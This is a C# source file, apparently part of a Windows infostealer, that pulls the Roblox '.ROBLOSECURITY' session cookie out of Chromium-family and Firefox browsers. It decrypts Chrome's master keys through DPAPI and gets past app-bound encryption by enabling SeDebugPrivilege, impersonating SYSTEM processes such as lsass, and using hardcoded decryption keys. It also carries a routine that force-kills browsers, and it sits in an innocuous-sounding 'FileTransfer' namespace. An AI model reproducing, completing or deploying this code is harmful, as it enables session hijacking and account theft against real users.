using System.ComponentModel;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using Microsoft.Data.Sqlite;

namespace FileTransfer;

public static class CookieExtractor
{
    private static readonly (string Vendor, string Name)[] Browsers = {
        ("Google",           "Chrome\\User Data"),
        ("Google",           "Chrome SxS\\User Data"),
        ("Microsoft",        "Edge\\User Data"),
        ("Microsoft",        "Edge SxS\\User Data"),
        ("BraveSoftware",    "Brave-Browser\\User Data"),
        ("Yandex",           "YandexBrowser\\User Data"),
        ("Vivaldi",          "User Data"),
        ("Opera Software",   "Opera Stable\\User Data"),
        ("",                 "Chromium\\User Data"),
    };

    private static readonly string[] BrowserExeNames = {
        "chrome", "msedge", "brave", "browser", "opera", "vivaldi", "firefox"
    };

    private static string LogPath = Path.Combine(Path.GetTempPath(), "cookie_debug.log");

    private static void Log(string msg)
    {
        try { File.AppendAllText(LogPath, $"[{DateTime.Now:HH:mm:ss}] {msg}\n"); }
        catch { }
    }

    public static string? ExtractRobloSecurity()
    {
        Log("=== ExtractRobloSecurity START ===");
        string local = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

        string? TryExtract()
        {
            foreach (var (vendor, name) in Browsers)
            {
                string userData = string.IsNullOrEmpty(vendor)
                    ? Path.Combine(local, name)
                    : Path.Combine(local, vendor, name);

                if (!Directory.Exists(userData)) continue;
                Log($"Found browser: {userData}");

                try
                {
                    string? token = ExtractFromChromium(userData);
                    if (!string.IsNullOrEmpty(token))
                    {
                        Log($"TOKEN FOUND! len={token.Length}");
                        return token;
                    }
                }
                catch (Exception ex)
                {
                    Log($"EXCEPTION {vendor} {name}: {ex}");
                }
            }

            try { return ExtractFromFirefox(); }
            catch (Exception ex) { Log($"Firefox: {ex}"); }

            return null;
        }

        // Читаем без закрытия браузеров
        Log("Skipping browser termination...");
        string? result = TryExtract();
        if (string.IsNullOrEmpty(result))
        {
            Log("Retry extraction...");
            result = TryExtract();
        }

        return result;
    }

    private static void RestartChrome()
    {
        try
        {
            string? chromePath = FindChromePath();
            if (chromePath == null) return;
            string userDataDir = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                "Google", "Chrome", "User Data");
            var psi = new System.Diagnostics.ProcessStartInfo
            {
                FileName = chromePath,
                Arguments = $"--user-data-dir=\"{userDataDir}\"",
                UseShellExecute = true
            };
            System.Diagnostics.Process.Start(psi);
            Log("Chrome restarted");
        }
        catch (Exception ex)
        {
            Log($"Chrome restart failed: {ex.Message}");
        }
    }

    private static string? FindChromePath()
    {
        string[] paths = {
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "Google", "Chrome", "Application", "chrome.exe"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), "Google", "Chrome", "Application", "chrome.exe"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Google", "Chrome", "Application", "chrome.exe"),
        };
        foreach (var p in paths)
            if (File.Exists(p)) return p;
        return null;
    }

    private static void KillAllBrowsers()
    {
        foreach (string pname in BrowserExeNames)
        {
            try
            {
                var psi = new System.Diagnostics.ProcessStartInfo
                {
                    FileName = "taskkill",
                    Arguments = $"/F /T /IM {pname}.exe",
                    CreateNoWindow = true,
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true
                };
                using var p = System.Diagnostics.Process.Start(psi);
                p?.WaitForExit(3000);
            }
            catch { }
        }
        Thread.Sleep(500);
    }

    private static string? ExtractFromChromium(string userDataPath)
    {
        string localStatePath = Path.Combine(userDataPath, "Local State");
        if (!File.Exists(localStatePath)) return null;

        string json;
        try { json = File.ReadAllText(localStatePath); }
        catch { return null; }

        using var doc = JsonDocument.Parse(json);
        if (!doc.RootElement.TryGetProperty("os_crypt", out var osCrypt)) return null;

        byte[]? v10Key = null;
        if (osCrypt.TryGetProperty("encrypted_key", out var encKeyEl))
        {
            string? encKeyB64 = encKeyEl.GetString();
            if (!string.IsNullOrEmpty(encKeyB64))
            {
                try
                {
                    byte[] encKey = Convert.FromBase64String(encKeyB64);
                    if (encKey.Length > 5 && encKey[0] == 'D' && encKey[1] == 'P' &&
                        encKey[2] == 'A' && encKey[3] == 'P' && encKey[4] == 'I')
                    {
                        v10Key = ProtectedData.Unprotect(encKey.AsSpan(5).ToArray(), null, DataProtectionScope.CurrentUser);
                        Log($"v10 master key OK, len={v10Key.Length}");
                    }
                }
                catch (Exception ex) { Log($"v10 key failed: {ex.Message}"); }
            }
        }

        byte[]? v20Key = null;
        if (osCrypt.TryGetProperty("app_bound_encrypted_key", out var abKeyEl))
        {
            string? abKeyB64 = abKeyEl.GetString();
            if (!string.IsNullOrEmpty(abKeyB64))
            {
                try
                {
                    v20Key = DeriveV20Key(abKeyB64);
                    if (v20Key != null)
                        Log($"v20 master key OK, len={v20Key.Length}");
                    else
                        Log("v20 key derivation returned null");
                }
                catch (Exception ex) { Log($"v20 key failed: {ex}"); }
            }
        }

        if (v10Key == null && v20Key == null)
        {
            Log("No usable decryption key");
            return null;
        }

        var profileDirs = new List<string>();
        foreach (var dir in Directory.GetDirectories(userDataPath))
        {
            string n = Path.GetFileName(dir).ToLowerInvariant();
            if (n == "default" || n.StartsWith("profile "))
                profileDirs.Add(dir);
        }

        string[] cookieRelPaths = { Path.Combine("Network", "Cookies"), "Cookies" };

        foreach (var profile in profileDirs)
        {
            foreach (var rel in cookieRelPaths)
            {
                string cookiesPath = Path.Combine(profile, rel);
                if (File.Exists(cookiesPath))
                {
                    string? token = ReadCookieFromDb(cookiesPath, v10Key, v20Key);
                    if (!string.IsNullOrEmpty(token)) return token;
                }
            }
        }

        return null;
    }

    public static byte[]? DeriveV20Key(string appBoundKeyB64)
    {
        byte[] raw = Convert.FromBase64String(appBoundKeyB64);
        if (raw.Length < 4 || raw[0] != 'A' || raw[1] != 'P' || raw[2] != 'P' || raw[3] != 'B')
        {
            Log($"APPB prefix missing: {BitConverter.ToString(raw, 0, Math.Min(8, raw.Length))}");
            return null;
        }

        byte[] keyBlobEncrypted = raw.AsSpan(4).ToArray();
        Log($"APPB stripped, blob len={keyBlobEncrypted.Length}");

        byte[] keyBlobSystemDecrypted;
        try
        {
            keyBlobSystemDecrypted = DPAPIUnprotectAsSystem(keyBlobEncrypted);
            Log($"SYSTEM DPAPI OK, len={keyBlobSystemDecrypted.Length}");
        }
        catch (Exception ex)
        {
            Log($"SYSTEM DPAPI failed: {ex.Message}");
            return null;
        }

        byte[] keyBlobUserDecrypted;
        try
        {
            keyBlobUserDecrypted = ProtectedData.Unprotect(keyBlobSystemDecrypted, null, DataProtectionScope.CurrentUser);
            Log($"User DPAPI OK, len={keyBlobUserDecrypted.Length}");
        }
        catch (Exception ex)
        {
            Log($"User DPAPI failed: {ex.Message}");
            return null;
        }

        var parsed = ParseKeyBlob(keyBlobUserDecrypted);
        Log($"Key blob parsed: flag={parsed.Flag}");

        return DeriveFromParsedBlob(parsed);
    }

    private static (byte Flag, byte[] IV, byte[] Ciphertext, byte[] Tag, byte[]? EncryptedAesKey) ParseKeyBlob(byte[] data)
    {
        int off = 0;
        int headerLen = BitConverter.ToInt32(data, off); off += 4;
        off += headerLen;
        int contentLen = BitConverter.ToInt32(data, off); off += 4;
        byte flag = data[off]; off += 1;

        if (flag == 1 || flag == 2)
        {
            byte[] iv = data.AsSpan(off, 12).ToArray(); off += 12;
            byte[] ct = data.AsSpan(off, 32).ToArray(); off += 32;
            byte[] tag = data.AsSpan(off, 16).ToArray(); off += 16;
            return (flag, iv, ct, tag, null);
        }
        else if (flag == 3)
        {
            byte[] encAesKey = data.AsSpan(off, 32).ToArray(); off += 32;
            byte[] iv = data.AsSpan(off, 12).ToArray(); off += 12;
            byte[] ct = data.AsSpan(off, 32).ToArray(); off += 32;
            byte[] tag = data.AsSpan(off, 16).ToArray(); off += 16;
            return (flag, iv, ct, tag, encAesKey);
        }

        throw new InvalidDataException($"Unsupported key blob flag: {flag}");
    }

    private static byte[] DeriveFromParsedBlob((byte Flag, byte[] IV, byte[] Ciphertext, byte[] Tag, byte[]? EncryptedAesKey) parsed)
    {
        if (parsed.Flag == 1)
        {
            byte[] hardcodedKey = ConvertHexStringToByteArray("B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787");
            using var aes = new AesGcm(hardcodedKey, 16);
            byte[] plain = new byte[parsed.Ciphertext.Length];
            aes.Decrypt(parsed.IV, parsed.Ciphertext, parsed.Tag, plain);
            return plain;
        }
        else if (parsed.Flag == 2)
        {
            byte[] hardcodedKey = ConvertHexStringToByteArray("E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660");
            byte[] plain = ChaCha20Poly1305Decrypt(hardcodedKey, parsed.IV, parsed.Ciphertext, parsed.Tag);
            return plain;
        }
        else if (parsed.Flag == 3)
        {
            byte[] decryptedAesKey;
            IntPtr hOrigThreadToken = GetCurrentThreadToken();
            try
            {
                ImpersonateLsass();
                decryptedAesKey = NCryptDecryptKey(parsed.EncryptedAesKey!);
            }
            finally
            {
                SetThreadToken(IntPtr.Zero, hOrigThreadToken);
                if (hOrigThreadToken != IntPtr.Zero) CloseHandle(hOrigThreadToken);
            }

            byte[] xorKey = ConvertHexStringToByteArray("CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390");
            byte[] xoredKey = XorBytes(decryptedAesKey, xorKey);
            using var aes = new AesGcm(xoredKey, 16);
            byte[] plain = new byte[parsed.Ciphertext.Length];
            aes.Decrypt(parsed.IV, parsed.Ciphertext, parsed.Tag, plain);
            return plain;
        }

        throw new InvalidDataException($"Unsupported flag: {parsed.Flag}");
    }

    private static byte[] XorBytes(byte[] a, byte[] b)
    {
        byte[] result = new byte[a.Length];
        for (int i = 0; i < a.Length; i++)
            result[i] = (byte)(a[i] ^ b[i]);
        return result;
    }

    private static byte[] ConvertHexStringToByteArray(string hex)
    {
        byte[] bytes = new byte[hex.Length / 2];
        for (int i = 0; i < bytes.Length; i++)
            bytes[i] = Convert.ToByte(hex.Substring(i * 2, 2), 16);
        return bytes;
    }

    private static byte[] ChaCha20Poly1305Decrypt(byte[] key, byte[] nonce, byte[] ciphertext, byte[] tag)
    {
        byte[] combined = new byte[ciphertext.Length + tag.Length];
        Buffer.BlockCopy(ciphertext, 0, combined, 0, ciphertext.Length);
        Buffer.BlockCopy(tag, 0, combined, ciphertext.Length, tag.Length);

        IntPtr hProv = IntPtr.Zero;
        IntPtr hKey = IntPtr.Zero;

        try
        {
            int status = BCryptOpenAlgorithmProvider(out hProv, "CHACHA20_POLY1305", null, 0);
            if (status != 0) throw new Win32Exception(status);

            byte[] keyBlob;
            using var ms = new MemoryStream();
            ms.Write(BitConverter.GetBytes(0x10), 0, 4); // BCRYPT_KEY_DATA_BLOB_MAGIC
            ms.Write(BitConverter.GetBytes(1), 0, 4);     // version
            ms.Write(BitConverter.GetBytes(key.Length), 0, 4);
            ms.Write(key, 0, key.Length);
            keyBlob = ms.ToArray();

            status = BCryptImportKeyPair(hProv, IntPtr.Zero, "KeyDataBlob", out hKey, keyBlob, keyBlob.Length, 0);
            if (status != 0) throw new Win32Exception(status);

            BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo = new BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO();
            authInfo.Init();
            authInfo.pbNonce = Marshal.UnsafeAddrOfPinnedArrayElement(nonce, 0);
            authInfo.cbNonce = (uint)nonce.Length;
            authInfo.pbAuthData = IntPtr.Zero;
            authInfo.cbAuthData = 0;
            authInfo.pbTag = Marshal.UnsafeAddrOfPinnedArrayElement(tag, 0);
            authInfo.cbTag = (uint)tag.Length;
            authInfo.pbMacContext = IntPtr.Zero;
            authInfo.cbMacContext = 0;
            authInfo.cbAad = 0;

            byte[] iv = new byte[16];
            Buffer.BlockCopy(nonce, 0, iv, 0, 12);

            int cbResult = 0;
            status = BCryptDecrypt(hKey, combined, combined.Length, ref authInfo, iv, iv.Length, null, 0, out cbResult, 0);
            if (status != 0) throw new Win32Exception(status);

            byte[] output = new byte[cbResult];
            status = BCryptDecrypt(hKey, combined, combined.Length, ref authInfo, iv, iv.Length, output, output.Length, out cbResult, 0);
            if (status != 0) throw new Win32Exception(status);

            byte[] result = new byte[cbResult];
            Buffer.BlockCopy(output, 0, result, 0, cbResult);
            return result;
        }
        finally
        {
            if (hKey != IntPtr.Zero) BCryptDestroyKey(hKey);
            if (hProv != IntPtr.Zero) BCryptCloseAlgorithmProvider(hProv, 0);
        }
    }

    private static byte[] NCryptDecryptKey(byte[] encryptedKey)
    {
        IntPtr hProv = IntPtr.Zero;
        IntPtr hKey = IntPtr.Zero;

        try
        {
            int status = NCryptOpenStorageProvider(out hProv, "Microsoft Software Key Storage Provider", 0);
            if (status != 0) throw new Win32Exception(status);

            // Try multiple key names
            string[] keyNames = { "Google Chromekey1", "Google Chromekey", "Chromekey1" };
            foreach (string keyName in keyNames)
            {
                status = NCryptOpenKey(hProv, out hKey, keyName, 0, 0);
                if (status == 0)
                {
                    Log($"NCryptOpenKey OK with name={keyName}");
                    break;
                }
                Log($"NCryptOpenKey({keyName}) failed: 0x{status:X8}");

                // Try with machine flag
                status = NCryptOpenKey(hProv, out hKey, keyName, 0, 0x10); // NCRYPT_MACHINE_KEY_FLAG
                if (status == 0)
                {
                    Log($"NCryptOpenKey(machine) OK with name={keyName}");
                    break;
                }
                Log($"NCryptOpenKey(machine,{keyName}) failed: 0x{status:X8}");
            }

            if (hKey == IntPtr.Zero)
                throw new Exception("No Chrome key found in NCrypt storage");

            int cbResult = 0;
            status = NCryptDecrypt(hKey, encryptedKey, encryptedKey.Length, IntPtr.Zero,
                null, 0, out cbResult, 0x40);
            if (status != 0) throw new Win32Exception(status);

            byte[] output = new byte[cbResult];
            status = NCryptDecrypt(hKey, encryptedKey, encryptedKey.Length, IntPtr.Zero,
                output, output.Length, out cbResult, 0x40);
            if (status != 0) throw new Win32Exception(status);

            byte[] result = new byte[cbResult];
            Buffer.BlockCopy(output, 0, result, 0, cbResult);
            return result;
        }
        finally
        {
            if (hKey != IntPtr.Zero) NCryptFreeObject(hKey);
            if (hProv != IntPtr.Zero) NCryptFreeObject(hProv);
        }
    }

    private static void ImpersonateLsass()
    {
        EnablePrivilege(SeDebugPrivilege);

        string[] systemProcs = { "winlogon", "services", "lsass", "wininit" };
        Exception lastEx = null;

        foreach (string procName in systemProcs)
        {
            uint pid = FindProcessPid(procName);
            if (pid == 0) continue;

            try
            {
                IntPtr hProcess = OpenProcess(ProcessAllAccess, false, pid);
                if (hProcess == IntPtr.Zero) throw new Win32Exception(Marshal.GetLastWin32Error());

                try
                {
                    if (!OpenProcessToken(hProcess, TokenDuplicate, out IntPtr hToken))
                        throw new Win32Exception(Marshal.GetLastWin32Error());

                    try
                    {
                        if (!DuplicateTokenEx(hToken, TokenAllAccess, IntPtr.Zero,
                            SecurityImpersonation, TokenImpersonation, out IntPtr hDupToken))
                            throw new Win32Exception(Marshal.GetLastWin32Error());

                        if (!SetThreadToken(IntPtr.Zero, hDupToken))
                            throw new Win32Exception(Marshal.GetLastWin32Error());

                        CloseHandle(hDupToken);
                        Log($"Impersonated SYSTEM via {procName}.exe (pid={pid})");
                        return;
                    }
                    finally
                    {
                        CloseHandle(hToken);
                    }
                }
                finally
                {
                    CloseHandle(hProcess);
                }
            }
            catch (Exception ex)
            {
                lastEx = ex;
                Log($"Impersonate {procName} failed: {ex.Message}");
            }
        }

        throw new Exception("Could not impersonate any SYSTEM process: " + (lastEx?.Message ?? "none found"));
    }

    private static byte[] DPAPIUnprotectAsSystem(byte[] encrypted)
    {
        IntPtr hOrigThreadToken = GetCurrentThreadToken();
        try
        {
            ImpersonateLsass();
            return ProtectedData.Unprotect(encrypted, null, DataProtectionScope.CurrentUser);
        }
        finally
        {
            SetThreadToken(IntPtr.Zero, hOrigThreadToken);
            if (hOrigThreadToken != IntPtr.Zero) CloseHandle(hOrigThreadToken);
        }
    }

    private static uint FindProcessPid(string name)
    {
        foreach (var proc in System.Diagnostics.Process.GetProcessesByName(name))
        {
            try { return (uint)proc.Id; }
            finally { proc.Dispose(); }
        }
        return 0;
    }

    private static uint FindLsassPid() => FindProcessPid("lsass");

    private static IntPtr GetCurrentThreadToken()
    {
        if (OpenThreadToken(GetCurrentThread(), TokenAllAccess, true, out IntPtr hToken))
            return hToken;
        return IntPtr.Zero;
    }

    private static void EnablePrivilege(string privilege)
    {
        IntPtr hToken;
        if (!OpenProcessToken(GetCurrentProcess(), TokenAdjustPrivileges | TokenQuery, out hToken))
            throw new Win32Exception(Marshal.GetLastWin32Error());

        try
        {
            LUID luid;
            if (!LookupPrivilegeValue(null, privilege, out luid))
                throw new Win32Exception(Marshal.GetLastWin32Error());

            TOKEN_PRIVILEGES tp = new()
            {
                PrivilegeCount = 1,
                Privileges = new LUID_AND_ATTRIBUTES[1]
            };
            tp.Privileges[0].Luid = luid;
            tp.Privileges[0].Attributes = SePrivilegeEnabled;

            if (!AdjustTokenPrivileges(hToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero))
                throw new Win32Exception(Marshal.GetLastWin32Error());
        }
        finally
        {
            CloseHandle(hToken);
        }
    }

    private static void CopyDbWithSharedAccess(string srcPath, string dstPath)
    {
        if (!File.Exists(srcPath)) return;
        using var src = new FileStream(srcPath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite | FileShare.Delete);
        using var dst = new FileStream(dstPath, FileMode.Create, FileAccess.Write, FileShare.None);
        src.CopyTo(dst);
    }

    private static string? ReadCookieFromDb(string dbPath, byte[]? v10Key, byte[]? v20Key)
    {
        string tmp = Path.Combine(Path.GetTempPath(), $"rbx_{Guid.NewGuid():N}.db");
        bool copied = false;
        try
        {
            for (int i = 0; i < 5; i++)
            {
                try
                {
                    CopyDbWithSharedAccess(dbPath, tmp);
                    CopyDbWithSharedAccess(dbPath + "-wal", tmp + "-wal");
                    CopyDbWithSharedAccess(dbPath + "-shm", tmp + "-shm");
                    copied = true;
                    Log($"DB copied OK on attempt {i + 1}");
                    break;
                }
                catch (IOException ex)
                {
                    Log($"DB copy attempt {i + 1}/5 failed: {ex.Message}");
                    Thread.Sleep(500);
                }
            }

            string connectionString;
            if (copied && File.Exists(tmp))
            {
                connectionString = $"Data Source={tmp}";
            }
            else
            {
                // Браузер запущен и держит файл — читаем напрямую в read-only
                connectionString = $"Data Source={dbPath};Mode=ReadOnly;Cache=Shared";
                Log("DB copy failed, reading original in ReadOnly");
            }

            using var conn = new SqliteConnection(connectionString);
            conn.Open();

            using var cmd = conn.CreateCommand();
            cmd.CommandText =
                "SELECT encrypted_value, value FROM cookies " +
                "WHERE host_key LIKE '%roblox%' AND name = '.ROBLOSECURITY' LIMIT 1";
            using var rdr = cmd.ExecuteReader();
            if (!rdr.Read())
            {
                Log("No .ROBLOSECURITY row");
                return null;
            }

            string? plainVal = rdr["value"] as string;
            if (!string.IsNullOrEmpty(plainVal)) return plainVal;

            long len = rdr.GetBytes(0, 0, null, 0, 0);
            if (len == 0) return null;

            byte[] buf = new byte[len];
            rdr.GetBytes(0, 0, buf, 0, buf.Length);

            string prefix = Encoding.ASCII.GetString(buf, 0, 3);
            Log($"Cookie prefix={prefix} len={len}");

            if (prefix == "v10" && v10Key != null)
            {
                try { return DecryptV10(buf, v10Key); }
                catch (Exception ex) { Log($"v10 decrypt failed: {ex.Message}"); }
            }

            if (prefix == "v20" && v20Key != null)
            {
                try { return DecryptV20(buf, v20Key); }
                catch (Exception ex) { Log($"v20 decrypt failed: {ex.Message}"); }
            }

            return null;
        }
        catch (Exception ex)
        {
            Log($"ReadCookieFromDb error: {ex.Message}");
            return null;
        }
        finally
        {
            try { if (File.Exists(tmp)) File.Delete(tmp); } catch { }
        }
    }

    private static string? DecryptV10(byte[] data, byte[] key)
    {
        const int off = 3;
        const int nonceLen = 12;
        const int tagLen = 16;
        if (data.Length < off + nonceLen + tagLen) return null;

        Span<byte> nonce = data.AsSpan(off, nonceLen);
        int ctLen = data.Length - off - nonceLen - tagLen;
        if (ctLen <= 0) return null;
        Span<byte> ciphertext = data.AsSpan(off + nonceLen, ctLen);
        Span<byte> tag = data.AsSpan(off + nonceLen + ctLen, tagLen);

        byte[] plain = new byte[ctLen];
        using var aes = new AesGcm(key, tagLen);
        aes.Decrypt(nonce, ciphertext, tag, plain);
        return Encoding.UTF8.GetString(plain).TrimEnd('\0');
    }

    private static string? DecryptV20(byte[] data, byte[] v20MasterKey)
    {
        // v20 layout: "v20"(3) + iv(12) + ciphertext(variable) + tag(16)
        // After AES-GCM decrypt: SHA256(32) + plaintext
        const int off = 3;
        const int nonceLen = 12;
        const int tagLen = 16;
        if (data.Length < off + nonceLen + tagLen) return null;

        byte[] iv = data.AsSpan(off, nonceLen).ToArray();
        int ctLen = data.Length - off - nonceLen - tagLen;
        if (ctLen <= 0) return null;
        byte[] ciphertext = data.AsSpan(off + nonceLen, ctLen).ToArray();
        byte[] tag = data.AsSpan(off + nonceLen + ctLen, tagLen).ToArray();

        byte[] plain = new byte[ctLen];
        using var aes = new AesGcm(v20MasterKey, tagLen);
        aes.Decrypt(iv, ciphertext, tag, plain);

        // Skip first 32 bytes (SHA256 hash of decrypted data)
        if (plain.Length <= 32) return null;
        return Encoding.UTF8.GetString(plain, 32, plain.Length - 32).TrimEnd('\0');
    }

    private static string? ExtractFromFirefox()
    {
        string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        string profiles = Path.Combine(appData, "Mozilla", "Firefox", "Profiles");
        if (!Directory.Exists(profiles)) return null;

        foreach (string dir in Directory.GetDirectories(profiles, "*.default*")
                     .Concat(Directory.GetDirectories(profiles, "*.dev-edition-default*")))
        {
            string db = Path.Combine(dir, "cookies.sqlite");
            if (!File.Exists(db)) continue;

            string tmp = Path.Combine(Path.GetTempPath(), $"ff_rbx_{Guid.NewGuid():N}.db");
            try
            {
                for (int i = 0; i < 10; i++)
                {
                    try { File.Copy(db, tmp, true); break; }
                    catch (IOException) { Thread.Sleep(500); }
                }
                if (!File.Exists(tmp)) continue;

                using var conn = new SqliteConnection($"Data Source={tmp}");
                conn.Open();
                using var cmd = conn.CreateCommand();
                cmd.CommandText =
                    "SELECT value FROM moz_cookies " +
                    "WHERE host LIKE '%roblox.com' AND name = '.ROBLOSECURITY' LIMIT 1";
                using var rdr = cmd.ExecuteReader();
                if (rdr.Read())
                {
                    object? val = rdr["value"];
                    if (val != null && val != DBNull.Value)
                        return val.ToString();
                }
            }
            catch { }
            finally
            {
                try { if (File.Exists(tmp)) File.Delete(tmp); } catch { }
            }
        }
        return null;
    }

    #region P/Invoke

    private const string SeDebugPrivilege = "SeDebugPrivilege";
    private const uint SePrivilegeEnabled = 0x00000002;
    private const uint TokenAllAccess = 0x000F01FF;
    private const uint TokenDuplicate = 0x0002;
    private const uint TokenAdjustPrivileges = 0x0020;
    private const uint TokenQuery = 0x0008;
    private const uint TokenImpersonation = 2;
    private const uint SecurityImpersonation = 2;
    private const uint ProcessAllAccess = 0x001F0FFF;

    [StructLayout(LayoutKind.Sequential)]
    private struct LUID
    {
        public uint LowPart;
        public int HighPart;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct LUID_AND_ATTRIBUTES
    {
        public LUID Luid;
        public uint Attributes;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct TOKEN_PRIVILEGES
    {
        public uint PrivilegeCount;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 1)]
        public LUID_AND_ATTRIBUTES[] Privileges;
    }

    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern bool OpenThreadToken(IntPtr ThreadHandle, uint DesiredAccess, bool OpenAsSelf, out IntPtr TokenHandle);

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    private static extern bool LookupPrivilegeValue(string? lpSystemName, string lpName, out LUID lpLuid);

    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);

    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, uint ImpersonationLevel, uint TokenType, out IntPtr phNewToken);

    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern bool SetThreadToken(IntPtr Thread, IntPtr Token);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr GetCurrentProcess();

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetCurrentThread();

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool CloseHandle(IntPtr hObject);

    [DllImport("bcrypt.dll", CharSet = CharSet.Unicode)]
    private static extern int BCryptOpenAlgorithmProvider(out IntPtr phAlgorithm, string pszAlgId, string? pszImplementation, uint dwFlags);

    [DllImport("bcrypt.dll", CharSet = CharSet.Unicode)]
    private static extern int BCryptImportKeyPair(IntPtr hAlgorithm, IntPtr hImportKey, string pszBlobType, out IntPtr phKey, byte[] pbInput, int cbInput, uint dwFlags);

    [DllImport("bcrypt.dll")]
    private static extern int BCryptDecrypt(IntPtr hKey, byte[] pbInput, int cbInput, ref BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO pPaddingInfo, byte[] pbIV, int cbIV, byte[]? pbOutput, int cbOutput, out int pcbResult, uint dwFlags);

    [DllImport("bcrypt.dll")]
    private static extern int BCryptDestroyKey(IntPtr hKey);

    [DllImport("bcrypt.dll")]
    private static extern int BCryptCloseAlgorithmProvider(IntPtr hAlgorithm, uint dwFlags);

    [DllImport("ncrypt.dll", CharSet = CharSet.Unicode)]
    private static extern int NCryptOpenStorageProvider(out IntPtr phProvider, string pszProviderName, uint dwFlags);

    [DllImport("ncrypt.dll", CharSet = CharSet.Unicode)]
    private static extern int NCryptOpenKey(IntPtr hProvider, out IntPtr phKey, string pszKeyName, uint dwLegacyKeySpec, uint dwFlags);

    [DllImport("ncrypt.dll")]
    private static extern int NCryptDecrypt(IntPtr hKey, byte[] pbInput, int cbInput, IntPtr pPaddingInfo, byte[]? pbOutput, int cbOutput, out int pcbResult, uint dwFlags);

    [DllImport("ncrypt.dll")]
    private static extern int NCryptFreeObject(IntPtr hObject);

    [StructLayout(LayoutKind.Sequential)]
    private struct BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO
    {
        public uint cbSize;
        public uint dwInfoVersion;
        public IntPtr pbNonce;
        public uint cbNonce;
        public IntPtr pbAuthData;
        public uint cbAuthData;
        public IntPtr pbTag;
        public uint cbTag;
        public IntPtr pbMacContext;
        public uint cbMacContext;
        public ulong cbAad;

        public void Init()
        {
            cbSize = (uint)Marshal.SizeOf<BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO>();
            dwInfoVersion = 1;
        }
    }

    #endregion
}
